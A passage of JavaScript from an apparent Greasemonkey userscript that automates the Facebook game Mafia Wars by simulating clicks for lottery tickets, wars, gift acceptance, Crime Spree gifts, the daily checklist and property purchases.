        var bonusClaim = xpathFirst('.//a/span[contains(@class, "sexy_lotto") and contains(text(), "Claim Prize")]', innerPageElt);
        if(!bonusClaim) bonusClaim = xpathFirst('.//a[@class="sexy_button_new short_white" and contains(text(), "Claim Prize")]', innerPageElt);
        if (bonusClaim) {
          Autoplay.fx = function() {
            clickElement(bonusClaim);
            addToLog('info Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance</span>: Claimed bonus: ' + autoLottoBonusList[GM_getValue('autoLottoBonusItem', 0)]);
            DEBUG('Claimed Daily Chance bonus item: ' + lottoPrize);
          };
          Autoplay.start();
          return true;
        }
        // Safety net. If we get here, then the page layout has changed and the buttons cannot be found
        DEBUG('Cannot click the Daily Chance bonus button.');
        Autoplay.fx = goHome;
        Autoplay.start();
        return false;
      } else {
        DEBUG('Daily Chance bonus not matched.');
      }
    }
  }

  var randomTicket = xpathFirst('.//div[@class="sexy_button" and contains(text(), "Auto-Select Numbers")]', innerPageElt);
  if (!randomTicket) randomTicket = xpathFirst('.//a[@class="sexy_button_new short_white" and @onclick="autoSelect(1);"]', innerPageElt);
  if (!randomTicket) randomTicket = xpathFirst('.//a[@class="sexy_button_new short_white" and contains(text(), "Auto-Select Numbers")]', innerPageElt);
  if (randomTicket) {
    clickElement(randomTicket);
    var submitTicket = xpathFirst('.//input[@class="sexy_lotto" and @type="submit" and contains(@value,"Submit Ticket")]', innerPageElt);
    if (!submitTicket) submitTicket = xpathFirst('.//button[@class="sexy_button_new short_white" and @type="submit" and @name="do"]', innerPageElt);
    if (submitTicket) {
      var ticket = ' ';
      for (i = 1; i < 6; i++) {
        var searchstring = './/div[@id="ticket_1_selected_' + i + '"]';
        lottonum = xpathFirst(searchstring, innerPageElt);
        ticket = ticket + lottonum.innerHTML;
        if (i<5)
          ticket = ticket + '-';
      }

      Autoplay.fx = goHome;
      clickElement(submitTicket);
      addToLog('info Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance</span>: Played ticket' + ticket + '.');
    }
    Autoplay.start();
    return true;
  }

  var lottoResults = xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(text(), "Results")]', innerPageElt);
  if (lottoResults) {
    var totalwinning = 0;
    var lottotable = xpath('.//table//tbody//tr//td[contains(text(), "Ticket #")]', innerPageElt);
    if (lottotable.snapshotLength == 0) {
      var noticketsEntered = xpath('.//center//div', innerPageElt);
      if ((noticketsEntered) && (noticketsEntered.snapshotLength>0) &&
         (noticketsEntered.snapshotItem(1).parentNode.innerHTML.indexOf("You didn't enter any tickets")!=-1))
        addToLog('info Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance</span>: No tickets entered for the last drawing.');
      else
        addToLog('warning Icon', 'BUG DETECTED: Can\'t find Daily Chance results.');
      return false;
    }
    var winningtickets = [0, 0, 0, 0, 0, 0];
    for (j = 0, numTickets=lottotable.snapshotLength; j < numTickets; j++) {
      var eachticket = lottotable.snapshotItem(j).parentNode.innerHTML;
      var count = 0;
      for (var k = 0, ticketLength=eachticket.length; k < ticketLength; k++) {
        if (eachticket.substr(k, 'gold'.length) == 'gold')
          count++;
      }
      winningtickets[count] = winningtickets[count] + 1;
    }
    var lottoLog = '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance winners</span>: ';
    var atleastOneWinner = false;
    for (j = 1; j < 6; j++)
      if (winningtickets[j]>0) {
        atleastOneWinner = true;
        if (winningtickets[j] == 1)
          lottoLog += winningtickets[j] + ' ticket';
        else
          lottoLog += winningtickets[j] + ' tickets';
        if (j == 1)
          lottoLog +=  ' matching ' + j + ' number;';
        else
          lottoLog += ' matching ' + j + ' numbers;';
      }
    if (lottoLog[lottoLog.length-1]==';')
      lottoLog = lottoLog.substring(0, lottoLog.length-1)+'.';
    else if (!atleastOneWinner)
      lottoLog += 'no winning tickets.';
    addToLog('info Icon', lottoLog);

    // Log any displayed prizes.
    if (atleastOneWinner) {
      var prizes = $x('.//table[@class="messages"]//center', innerPageElt);
      for (i = 0, numPrizes=prizes.length; i < numPrizes; ++i) {
        var description = prizes[i].innerHTML.untag().trim();
        if (description) {
          addToLog('yeah Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Prize</span>: ' + description);
        }
      }
    }

    Autoplay.fx = goHome;
    Autoplay.start();
    return true;
  }

  return false;
}

function autoWishlist() {
  var shareWishlist = parseFloat(GM_getValue('autoShareWishlistTime', '1'));
  // Go to the wishlist.
  var elt = xpathFirst('//div[@class="nav_link profile_link"]//a');
  var wishlistElt = xpathFirst('.//div[@id="wishlist_share_button"]', innerPageElt);
  if (elt) {
    clickElement(elt);
    DEBUG('Redirecting to post wishlist');
    if (wishlistElt) {
      var buttonElt = xpathFirst('.//a', wishlistElt);
      if (buttonElt) {
          clickElement(buttonElt);
          addToLog('info Icon','Clicked to share wishlist, sharing again in '+shareWishlist+' hour(s)');
          if(shareWishlist == 1)
            setGMTime('wishListTimer', '1 hour');
          else
            setGMTime('wishListTimer', shareWishlist + ' hours');
      } else {
        addToLog('warning Icon', 'Unable to share your wishlist, will try later.');
        setGMTime('wishListTimer', '05:00');
      }
    }
  }
}

// Attack the first war opponent you can
function autoWarAttack() {

  // Betray logic
  if (isGMChecked('autoWarBetray')) {
    var betrayElts = $x('.//div//a[@class="sexy_button"]//span[contains(.,"Betray")]', innerPageElt);

    // Betray a random friend
    if (betrayElts && betrayElts.length > 0) {
      var betrayFriend = betrayElts[Math.floor(Math.random() * betrayElts.length)];
      Autoplay.fx = function() {
        clickAction = 'war';
        clickElement(betrayFriend);
        DEBUG('Clicked betray friend button.');
      };
      Autoplay.start();
      return true;
    }
  }

  if (helpWar) {
    // Help attempt was processed. Increment the update count.
    GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));
    helpWar = false;
  }

  // Click only the attack button on the right side of the war screen
  var getWarAttackElt = function (parentElt) {
    // Get the "right" side elements
    if (parentElt && parentElt.childNodes[5]) {
      var atkElt = xpathFirst('.//a[@class="sexy_button"]//span[contains(.,"Attack")]', parentElt.childNodes[5]);
      if (!atkElt) atkElt = xpathFirst('.//a[@class="sexy_button_new short_red sexy_attack_new"]//span[contains(.,"Attack")]', parentElt.childNodes[5]);
      if (atkElt) return atkElt;
    }
    return false;
  };

  // Retrieve attack button
  var attackElt = getWarAttackElt(xpathFirst('//div[contains(@style,"700px") and contains(.,"vs")]'));
  if (!attackElt) attackElt = getWarAttackElt(xpathFirst('//div[contains(@style,"700px") and contains(.,"Top Mafia")]'));

  if (attackElt) {
    Autoplay.fx = function() {
      clickAction = 'war';
      clickElement(attackElt);
      DEBUG('Clicked the war attack button.');
    };
    Autoplay.start();
    return true;
  }

  return false;
}

function autoWar() {
  var action = 'war';
  Autoplay.delay = getAutoPlayDelay();

  var actionElt = getActionBox('War');
  if (actionElt) {
    // Check if "War in Progress" is there
    // FIXME: Causes looping
    var actionLink = getActionLink (actionElt, 'Check War');
    if (actionLink && checkOnWar) {
      Autoplay.fx = function() {
        setGMTime('warTimer', '00:00');
        clickElement(actionLink);
        DEBUG('Clicked to check war in progress.');
        checkOnWar = false;
      };
      Autoplay.start();
      return true;
    }

    // Check if "Reward friends" is there
    actionLink = getActionLink (actionElt, 'Reward Friends');
    if (actionLink) {
      Autoplay.fx = function() {
        setGMTime('warTimer', '00:00');
        clickElement(actionLink);
        DEBUG('Clicked to reward friends.');
      };
      Autoplay.start();
      return true;
    }
  }

  // Check the timer, do we even need to go further?
  if (timeLeftGM('warTimer') > 0) return false;

  // We need to be on the war page to go any further
  if (!onWarTab()) {
    Autoplay.fx = goWarTab;
    Autoplay.start();
    return true;
  }

  // Click Start a new war
  var warStartButton = xpathFirst('.//div//a[@class="sexy_button" and contains(.,"Start a new war")]', innerPageElt);
  if (warStartButton) {
    Autoplay.fx = function() {
      clickAction = action;
      clickElement(warStartButton);
      checkOnWar = true;
      DEBUG('Clicked to start a new war.');
    };
    Autoplay.start();
    return true;
  }

  // Check for a war that may already be under way!
  var warStatus = xpathFirst('.//span[contains(@id, "war_timer")]', innerPageElt);
  if (warStatus) {
    var warTimer = warStatus.innerHTML;
    setGMTime('warTimer', warTimer);
    DEBUG('War is not available yet, checking again after ' + warTimer + ' hours.');
  } else {
    // Get war Target
    var warFriendsList = $x('.//a[contains(@href, "xw_action=declare_war")]', innerPageElt);
    if (warFriendsList) {
      var warElt = warFriendsList[Math.floor(Math.random() * warFriendsList.length)];
    }

    // Html attributes has been changed by Zynga, disable autoWar
    if (!warElt || (warElt && !warElt.getAttribute('onclick').match(/target_id=p%7C(\d+)/))) {
      DEBUG('War elements changed by Zynga, disabling autoWar.');
      GM_setValue('autoWar', 0)
      return false;
    }
    warElt.target_id = RegExp.$1;

    // Create clickable element for war list
    if (GM_getValue('warMode', 0) == 1)  {
      var tmpWarTargets = GM_getValue('autoWarTargetList');
      if (tmpWarTargets) {
        tmpWarTargets = tmpWarTargets.split('\n');
        var thisAutoWarTarget = tmpWarTargets[0];

        // Fake the target id
        warElt.target_id = thisAutoWarTarget;
        warElt.setAttribute('onclick', warElt.getAttribute('onclick').replace(RegExp.$1, thisAutoWarTarget));

        DEBUG('Auto War Target = ' + thisAutoWarTarget);
      } else {
        // Target is not set, declare war on a random friend
        addToLog('warning Icon','Invalid war target (id='+thisAutoWarTarget+'). Declaring war on a random friend.');
      }
    }

    // War!!!
    Autoplay.fx = function() {
      clickAction = action;
      clickContext = warElt;
      clickElement(warElt);
      DEBUG('Clicked to start a new war.');
    };
    Autoplay.start();
    return true;
  }
  return false;
}

function autoGiftWaiting() {
  // Check the message box menu for gifts, rather than opening each gift, just go to the loot page to see them all
  var eltGiftsWaiting = xpathFirst('.//div[contains(@id, "counter_bg_send_gifts")]', innerPageElt);
  if (eltGiftsWaiting) {
    // Build the clickable element
    // Switch between the loot page and the collections page
    GM_setValue('autoGiftWaitingPage', GM_getValue('autoGiftWaitingPage',0)?0:1);
    var page = (GM_getValue('autoGiftWaitingPage') ? 'collection' : 'loot');
    var pagehtml = '"remote/html_server.php?xw_controller=' + page + '&xw_action=view&xw_city=1"';
    var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+ pagehtml + ', 1, 1, 0, 0); return false;'});
    if (elt) {
      Autoplay.fx = function() {
        clickElement(elt);
        DEBUG('Clicked to view gifts by going to the ' + page + ' page via ' + pagehtml);
      };
      Autoplay.start();
      return true;
    }
  }
  return false;
}

var giftQueue = new Array();
function autoGiftQueue() {
  // Any entries in the queue?
  if (!giftQueue.length) {
    if (autoGiftWindowClose()) return false;
    return false;
  }

  //  Make sure that gift window is open, otherwise we lose the gift!
  var iframeGiftWindow = document.getElementById('message_center_div_iframe');
  if (!iframeGiftWindow) {
    autoGiftWindowOpen();
    return true;
  }

  // We're gonna grab entries off the queue 1 at a time
  var thisGift = giftQueue.pop();
  DEBUG('Gifts: giftQueue: ' + giftQueue.length + ' ' + thisGift);

  // Simulate a mouse click on the element.
  if (iframeGiftWindow && thisGift) {
    var evt = iframeGiftWindow.contentDocument.createEvent('MouseEvents');
    evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    thisGift.dispatchEvent(evt);
    DEBUG('Gifts: Click to process gift.');
    Autoplay.fx = function() { autoGiftQueue(); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }
  return false;
}

function autoGiftWindowClose() {
  // If there are queue entries, then we still need to process them
  if (giftQueue.length) return false;

  // Let's close the window!
  var iframeGiftWindow = document.getElementById('message_center_div_iframe');
  if (!iframeGiftWindow) return false;
  var eltCloseWindow = iframeGiftWindow.contentDocument.evaluate('//a[contains(@onclick,"closeMessageCenter")]', iframeGiftWindow.contentDocument, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
  if (!eltCloseWindow) return false;

  // Ok, close the gift window!
  // Simulate a mouse click on the element.
  Autoplay.fx = function() {
    var iframeGiftWindow = document.getElementById('message_center_div_iframe');
    var eltCloseWindow = iframeGiftWindow.contentDocument.evaluate('//a[contains(@onclick,"closeMessageCenter")]', iframeGiftWindow.contentDocument, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
    var evt = iframeGiftWindow.contentDocument.createEvent('MouseEvents');
    evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    eltCloseWindow.dispatchEvent(evt);
    DEBUG('Gifts: Clicked to close gift window.');
    autoGiftQueue();
  };

  // Restart the timers.
  Autoplay.delay = 1000;
  Autoplay.start();
  Reload.delay = 5000;
  Reload.start();
  setGMTime('autoGiftAcceptTimer', "00:05:00");
  return true;
}

function autoGiftWindowOpen() {
  // Is it already open?
  var iframeGiftWindow = document.getElementById('message_center_div_iframe');
  if (iframeGiftWindow) {
    // Setup to start the queue!
    Autoplay.fx = function() { autoGiftQueue(); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Grab the iframe for the envelope and see how many gifts there are
  // This is the gift count iframe at the top of the page, part of the envelope
  var iframeGiftCount = document.getElementById('message_center_button');
  if (!iframeGiftCount) return false;
  // Valid iframe, now get the gift count button
  var eltGiftCount = iframeGiftCount.contentDocument.getElementById('button_counter');
  if (!eltGiftCount) return false;

  // Valid button, now parse the content (if no gifts then this contains &nbsp; which will resolve to 0
  var giftCount = isNaN(parseInt(eltGiftCount.innerHTML))?0:parseInt(eltGiftCount.innerHTML);
  DEBUG('Gift Envelope: giftCount = ' +  giftCount);

  // Do we have a gift? If not, time to leave.
  if (!giftCount) return false;

  // If we are here, then there are gifts to process, so open the Gift Window frame
  clickElement(eltGiftCount);
  DEBUG('Clicked to open gift window.');

  // Clear reload timer
  Reload.clearTimeout();

  // Setup to wait for the window to open!
  Autoplay.fx = function() { autoGiftAccept(); };
  Autoplay.delay = getAutoPlayDelay();
  Autoplay.delay = 10000;
  Autoplay.start();

  return true;
}

function autoGiftAccept() {
  // Damn these frames!
  if (!onHome()) return false;
  // Need to be enabled
  if (!isGMChecked('autoGiftAccept')) return false;

  // If there are queue entries, then we still need to process them
  if (giftQueue.length) return true;

  // We're only coming to this routine every few minutes because it opens a window
  if (timeLeftGM('autoGiftAcceptTimer')) return false;

  // First, let's see if the iframe is already there, if it is, then we may need to process some gifts!
  // This is the gift window iframe where all the gifts are listed
  // If this iframe is active then the window is open, or maybe it was previously opened
  var iframeGiftWindow = document.getElementById('message_center_div_iframe');
  if (iframeGiftWindow) {
    // How many gifts are there? Use the frames live data!
    eltGiftCount = iframeGiftWindow.contentDocument.getElementById("numNewEvents");
    if (!eltGiftCount) return false;
    giftCount = parseInt(eltGiftCount.innerHTML);
    addToLog('info Icon', 'Gifts: Checking ' + giftCount + ' gifts');

    // Grab all the 3012 class gifts
    var eltGiftContainer3012 = iframeGiftWindow.contentDocument.evaluate('//*[@id="event_container_3012"]//div[@class="event"]', iframeGiftWindow.contentDocument, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    if (eltGiftContainer3012) {
      var giftCount3012 = eltGiftContainer3012.snapshotLength;
      DEBUG('Gifts: giftCount3012 = ' + giftCount3012);
      if (giftCount3012 > 0) {
        // Ok, we have at least one gift!
        for (var i =0; i < giftCount3012; i++) {
          var eltThisGift = eltGiftContainer3012.snapshotItem(i).innerHTML.slice(eltGiftContainer3012.snapshotItem(i).innerHTML.indexOf('id="event_')+10,eltGiftContainer3012.snapshotItem(i).innerHTML.indexOf('_main"'));
          var eltX = 'event_' + eltThisGift + '_main';
          var eltGiftContent = iframeGiftWindow.contentDocument.getElementById(eltX);
          var giftSender = eltGiftContent.innerHTML.slice(0, eltGiftContent.innerHTML.indexOf(' has sent you')).untag().clean().ltrim().rtrim();
          var giftObject = eltGiftContent.innerHTML.slice(eltGiftContent.innerHTML.indexOf(' has sent you')+13,eltGiftContent.innerHTML.indexOf(' in Mafia Wars')).untag().clean().ltrim().rtrim();

          var eltX = 'event_' + eltThisGift + '_buttons';
          var eltGiftAccept = iframeGiftWindow.contentDocument.evaluate('//div[@id="'+eltX+'"]//input[contains(@value,"Open It") or contains(@value,"Accept")]', iframeGiftWindow.contentDocument, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;

          // Add this gift to the queue
          giftQueue.push(eltGiftAccept);
          addToLog('info Icon','Gifts: Queued ' + giftObject + ' from ' + giftSender);
        }
        // Kick off the Queue!
        Autoplay.fx = function() { autoGiftQueue(); };
        Autoplay.delay = getAutoPlayDelay();
        Autoplay.start();
        return true;
      }
    }

    // Gift Window is open, no 3012 gifts, check for 3018 styles

    // Grab all the 3018 class gifts
    // For 3018 style gifts we should only do them one at a time, this loop only processes once, it is left here for when/if it is changed.
    var eltGiftContainer3018 = iframeGiftWindow.contentDocument.evaluate('//*[@id="event_container_3018"]//div[@class="event"]', iframeGiftWindow.contentDocument, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    if (eltGiftContainer3018) {
      var giftCount3018 = eltGiftContainer3018.snapshotLength;
      DEBUG('Gifts: giftCount3018 = ' + giftCount3018);
      if (giftCount3018 > 0) {
        // Ok, we have at least one gift!
        for (var i =0; i < giftCount3018; i++) {
          var eltThisGift = eltGiftContainer3018.snapshotItem(i).innerHTML.slice(eltGiftContainer3018.snapshotItem(i).innerHTML.indexOf('id="event_')+10,eltGiftContainer3018.snapshotItem(i).innerHTML.indexOf('_main"'));
          var eltX = 'event_' + eltThisGift + '_main';
          var eltGiftContent = iframeGiftWindow.contentDocument.getElementById(eltX);
          var giftSender = eltGiftContent.innerHTML.slice(0, eltGiftContent.innerHTML.indexOf(' needs a partner')).untag().clean().ltrim().rtrim();
          var giftObject = eltGiftContent.innerHTML.slice(eltGiftContent.innerHTML.indexOf(' pull off his ')+13,eltGiftContent.innerHTML.indexOf('. Choose to ')).untag().clean().ltrim().rtrim();

          var eltX = 'event_' + eltThisGift + '_buttons';
          var eltGiftAccept = iframeGiftWindow.contentDocument.evaluate('//div[@id="'+eltX+'"]//input[contains(@value,"Open It") or contains(@value,"Accept")]', iframeGiftWindow.contentDocument, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
          addToLog('info Icon','Gifts: Grabbed ' + giftObject + ' from ' + giftSender);

          // Simulate a mouse click on the element.
          var evt = iframeGiftWindow.contentDocument.createEvent('MouseEvents');
          evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
          eltGiftAccept.dispatchEvent(evt);
          // NOTICE: Clicking this element causes Mafia Wars to refresh
          // Processing will pick up in the initialization section where the 3018 popup is handled.
          Autoplay.delay = getAutoPlayDelay();
          Autoplay.start();
          return true;
        }
      }
    }
    // If we get here, there were 3018 gifts but couldn't get them
    //return false;
  }

  // If we are here, then open the gift window
  if (autoGiftWindowOpen()) return true;

  // Gift window isn't open, and we have no idea how many gifts, just leave
  // Restart the timers.
  Autoplay.fx = function() { autoGiftWindowClose(); };
  Autoplay.delay = 1000;
  Autoplay.start();
  Reload.delay = 5000;
  Reload.start();
  return false;
}

function autoSafehouse() {
  // Need to be enabled
  if (!isGMChecked('autoSafehouse')) return false;

  // We're only coming to this routine every few minutes
  if (timeLeftGM('autoSafehouseTimer')) return false;

  if (!onSafehouseNav()) {
    // Go to Safehouse!
    Autoplay.fx = goSafehouseNav;
    Autoplay.start();
    return true;
  }

  // Clearing these timeouts helps keep us on the page
  Autoplay.clearTimeout();
  Reload.clearTimeout();

  // Grab the first gift location
  var eltSafehouseGift = xpathFirst('.//div[@class="gift_safehouse_gift_display"]', innerPageElt);
  //DEBUG('eltSafehouseGift = ' + eltSafehouseGift);
  if (!eltSafehouseGift) {
    addToLog('info Icon','Crime Spree: No gifts available');
    setGMTime('autoSafehouseTimer', "00:10:00");
    return false;
  }
  var cntSafehouseGiftReady = eltSafehouseGift.innerHTML.indexOf('door_open');
  if (cntSafehouseGiftReady < 0) {
    // No gift ready to be open
    addToLog('info Icon','Crime Spree: No gifts available');
    setGMTime('autoSafehouseTimer', "00:10:00");
    return false;
  }

  // Really, this about all that has to be done, the rest is cosmetic
  // This URL doesn't seem to change at this time since the refresh causes all the gifts to shift
  addToLog('info Icon','Crime Spree: Grabbing a gift!');
  document.location = "http://apps.facebook.com/inthemafia/remote/html_server.php?xw_controller=safehouse&xw_action=open_gift_free&xw_city=1&box_num=0";

  // This might never be needed, but let's just do it anyway
  Autoplay.delay = 30000;
  Autoplay.start();
  return true;
}

function autoDailyChecklist() {
  // Need to be on the main home page
  if (!onHome()) return false;
  // Need to be enabled
  if (!isGMChecked('autoDailyChecklist')) return false;

  // Let's do this code once in a while.
  if (timeLeftGM('dailyChecklistTimer')) return false;
  setGMTime('dailyChecklistTimer', "00:30:00");

  // This routines goal is to click the daily checklist to grab the daily skill point
  // To get the skill point we can 'skip' through the checklist, we just have actually do the skip
  // The checklist checkmarks are not good indicators of the current skill point status, for example, they may all be
  // checked but the skill point doesn't appear, but if you click them each again it does. Why were they checked if they
  // needed to be clicked again? So, every once in a while, let's click through them just because we can.

  addToLog('info Icon','Daily Checklist: Processed.');

  // Challenge Mission
  var eltTemp = xpathFirst('.//*[@id="message_box_menu_checkmark_challenge_mission" and contains(@class, "_checked")]', innerPageElt);
  var eltTempClick = xpathFirst('.//div[@class="mbox_click_wrapper_two" and contains(@onclick,"challenge")]', innerPageElt);
  if (eltTempClick) {
    clickElement(eltTempClick);
  }

  // Grow your family
  var eltGrow = xpathFirst('.//*[@id="message_box_menu_checkmark_mafia" and contains(@class, "_checked")]', innerPageElt);
  var eltGrowSkip = xpathFirst('.//a[@class="sexy_button_new" and contains(@onclick, "skipCategory") and contains(@onclick, "mafia")]', innerPageElt);
  if (eltGrowSkip) {
    clickElement(eltGrowSkip);
  }

  // Gifts
  var eltGifts = xpathFirst('.//*[@id="message_box_menu_checkmark_send_gifts" and contains(@class, "_checked")]', innerPageElt);
  var eltGiftsSkip = xpathFirst('.//a[@class="sexy_button_new" and contains(@onclick, "skipCategory") and contains(@onclick, "send_gifts")]', innerPageElt);
  if (eltGiftsSkip) {
    clickElement(eltGiftsSkip);
  }

  // Messages
  // If there is a war in progress, this might need to be clicked.
  var eltMessages = xpathFirst('.//*[@id="message_box_menu_checkmark_messages" and contains(@class, "_checked")]', innerPageElt);
  var eltMessagesClick = xpathFirst('.//div[@class="mbox_click_wrapper_two" and contains(@onclick,"messages")]', innerPageElt);
  var eltActionTaken = makeElement('a', null, {'onclick':'mboxActionTaken("messages", true);'});
  if (eltMessagesClick) {
    clickElement(eltMessagesClick);
  }
  if (eltActionTaken) clickElement(eltActionTaken);

  // Energy Packs
  // There is already a function to handle using and sending the energy packs, this just makes sure the box is checked
  // If there's an energy pack to send, or if an energy pack is waiting to be used, then we'll not do anything since other code will check this box
  // Another possibility is that the user has selected to either not send energy packs or to not use them, in that case, we'll never be able to check this box
  if (!isGMChecked('sendEnergyPack') || (!isGMChecked('autoEnergyPack') && !isGMChecked('autoEnergyPackForce'))) {
    return false;
  }
  var actionElt = document.getElementById('message_box_menu_counter_bg_energy_packs');
  if (!actionElt) {
    var eltPacks = xpathFirst('.//*[@id="message_box_menu_checkmark_energy_packs" and contains(@class, "_checked")]', innerPageElt);
    var eltPacksClick = xpathFirst('.//div[@class="mbox_click_wrapper_two" and contains(@onclick,"energy_packs")]', innerPageElt);
    if (eltPacksClick) {
      clickElement(eltPacksClick);
    }
  }

  // When we get here everything has a check mark whether we forced it or not
  return false;
}

function goProperties(propCity) {
  // Make sure we're in the correct city
  if (city != propCity) {
    Autoplay.fx = function () { goLocation(propCity); };
    Autoplay.start();
    return true;
  }

  // Go to the city's property nav
  if (!onPropertyNav()) {
    Autoplay.fx = goPropertyNav;
    Autoplay.start();
    return true;
  }

  return false;
}

// This function returns false if nothing was done, true otherwise.
function upgradeProps(propCity) {
  var bestPropName = 'bestProp' + cities[propCity][CITY_NAME];

  // Skipping logic
  if (GM_getValue(bestPropName) == 'skip') return false;

  if (isGMUndefined(bestPropName) || isNaN(cities[propCity][CITY_CASH])) {
    if (goProperties(propCity)) return true;
  }

  var bestProp = eval('(' + GM_getValue(bestPropName) + ')');
  var buyCost = parseFloat(bestProp['cost']);
  var minCash = parseInt(GM_getValue('minCash' + cities[propCity][CITY_NAME], 0));

  // Make sure there's something to buy and the amounts are valid.
  if (isNaN(buyCost) || isNaN(minCash) || isNaN(cities[propCity][CITY_CASH])) return false;

  // Make sure enough cash will be left over.
  if (buyCost > cities[propCity][CITY_CASH] - minCash) return false;

  if (goProperties(propCity)) return true;

  DEBUG('Auto-upgrade: name=' + bestProp['name'] + ', id=' + bestProp['id'] + ', cost=' + bestProp['cost']);

  var buyElt = xpathFirst('.//a[contains(@onclick,"building_type=' + bestProp['id'] + '")]', innerPageElt);
  if (buyElt) {
    Autoplay.fx = function() {
      clickAction = 'buy property';
      clickElement(buyElt);
      DEBUG('Clicked to buy ' + bestProp['name'] + '.');
    };
    Autoplay.start();
    return true;
  }

  return false;
}

function onHome() {
  // Return true if we're on the home page, false otherwise.
  if (xpathFirst('.//div[@class="playerupdate_box"]', innerPageElt)) {
    return true;
  }

  return false;
}

function onSafehouseNav() {
  // Return true if we're on the Crime Spree nav, false otherwise.
  if (xpathFirst('.//*[contains(@id,"gift_safehouse_content")]', innerPageElt)) {
    //DEBUG('Crime Spree: On Crime Spree page');
    return true;
  }
  //DEBUG('Crime Spree: NOT on Crime Spree page');
  return false;
}

function onLottoNav() {
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Play")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onWarTab() {
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Declare War")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onPropertyNav() {
  // Return true if we're on the property nav, false otherwise.
  if (xpathFirst('.//*[@name="buy_props" or @id="flash_content_propertiesV2" or @id="propertyV2Help"]', innerPageElt)) {
    return true;
  }

  return false;
}

function onProfileNav() {
  // Return true if we're on the profile nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_off")]//a[contains(., "Achievements")]', innerPageElt)) {
    return true;
  }

  return false;
}

function onMyMafiaNav() {
  // Return true if we're on My Mafia nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_first")]//a[contains(., "Recruit")]', innerPageElt)) {
    return true;
  }

  return false;
}

function onFightTab() {
  // Return true if we're on the fight tab, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Fight")]', innerPageElt)) {
    return true;
  }

  return false;
}

function onHitlistTab() {
  // Return true if we're on the hitlist tab, false otherwise.
  if (xpathFirst('.//table[@class="hit_list"]', innerPageElt)) {
    return true;
  }

  return false;
}

function onLootTab() {
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Loot")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onCollectionsTab() {
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Collections")]', innerPageElt)) {
    return true;
  }
  return false;
}

function loadHome() {
  document.location = 'http://apps.facebook.com/inthemafia/index.php';
}

function goHome() {
  // Home is not available yet
  if (level < 6) {
    DEBUG('Home not available yet, going to jobs instead');
    goJobsNav();
    return;
  }

  // Find the visible home link.
  var elt = xpathFirst('//div[@id="nav_link_home_unlock"]//a');
  if (!elt) {
    // Find the visible home link.
    var elts = $x('//div[@class="nav_link home_link"]//a');
    for (var i = 0, numElts=elts.length; i < numElts; ++i) {
      if (elts[i].scrollWidth) {
        elt = elts[i];
        break;
      }
    }

    if (!elt) {
      DEBUG('Can\'t find home link to click. Using fallback method.');
      loadHome();
      return;
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go home.');
}

function goSafehouseNav() {
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page","remote/html_server.php?xw_controller=safehouse&xw_action=view", 1, 1, 0, 0); return false;'});
  if (!elt) {
    addToLog('warning Icon', 'Can\'t make Crime Spree nav link to click.');
  } else {
    clickElement(elt);
    DEBUG('Clicked to load Crime Spree nav.');
  }
  return;
}

function goProfileNav(player) {
  var elt = player.profile;

  // Get the profile click element
  if (!elt || !elt.getAttribute('onclick')) {
    elt = xpathFirst('.//table[@class="main_table fight_table"]//a[contains(@href, "xw_controller=stats")]', innerPageElt);
  }

  // Try to "fix" the onclick event
  if (elt && elt.getAttribute('onclick').match(/user=(\w+)/)) {
    var newClick = elt.getAttribute('onclick');
    var oldID = newClick.split('&user=')[1].split('\'')[0].split('&')[0];
    newClick = newClick.replace(oldID, player.id);

    // Fix AJAX loading of profile link
    if (newClick.match(/this.href/))
      newClick = newClick.replace('this.href=\'http://mwfb.zynga.com/mwfb/','return do_ajax(\'inner_page\', \'') + ', 1, 1, 0, 0); return false;';

    elt.setAttribute('onclick', newClick);
    clickElement(elt);
    DEBUG('Clicked to load profile (id=' + player.id + ', onclick=' + elt.getAttribute('onclick') + '). ');
    return;
  }

  // Try to create the link, some fight pages do not contain any profile links
  elt = xpathFirst('.//table[@class="main_table fight_table"]//a[contains(@href, "xw_controller=fight")]', innerPageElt);
  if (elt && elt.getAttribute('onclick').match(/opponent_id=(\w+)/)) {
    var newClick = " return do_ajax('inner_page', 'remote/html_server.php?xw_controller=stats&xw_action=view&xw_city="+city+"&user="+player.id+"&ref=fight_list', 1, 1, 0, 0); return false; ";
    elt.setAttribute('onclick', newClick);
    clickElement(elt);
    DEBUG('Clicked to load profile (id=' + player.id + ', onclick=' + elt.getAttribute('onclick') + '). ');
    return;
  }

  DEBUG("Couldnt find profile link");
  goFightNav();
  return;
}

function goMyProfile() {
  if(new_header){
    var elt = xpathFirst('//a[@class="dropdown_narrow"]');
  } else {
